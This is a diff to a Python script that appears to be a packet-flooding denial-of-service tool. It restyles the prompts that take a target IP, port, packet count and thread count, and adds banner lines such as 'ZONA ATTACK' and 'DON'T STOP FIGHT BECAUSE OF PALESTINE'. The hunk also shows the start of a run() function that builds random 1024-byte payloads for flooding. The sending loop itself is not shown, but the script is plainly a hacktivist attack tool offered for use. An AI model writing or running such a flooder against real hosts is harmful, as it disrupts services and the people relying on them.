@@ -57,11 +57,25 @@ while attemps < 100:
         continue
 os.system("clear")
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
+print("\033[33m———————⟩⟩⟩")
+port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
+print("\033[32m———————⟩⟩⟩")
+packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
+print("\033[31m-——————⟩⟩⟩")
+thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
+print("\033[94m———————⟩⟩⟩"),
+time.sleep(5),
+print("\033[96m                  ⟩⟩  WELCOME \033[0m "),
+time.sleep(5),
+print("\033[92m                  ⟩⟩  TO ZONA ATTACK \033[0m "),
+time.sleep(5),
+print("\033[1m                  ⟩⟩  DON'T STOP FIGHT \033[0m "),
+time.sleep(5),
+print("\033[97m                  ⟩⟩  BECAUSE OF PALESTINE \033[0m "),
+time.sleep(5),
+print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
+time.sleep(5),
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[-]"))
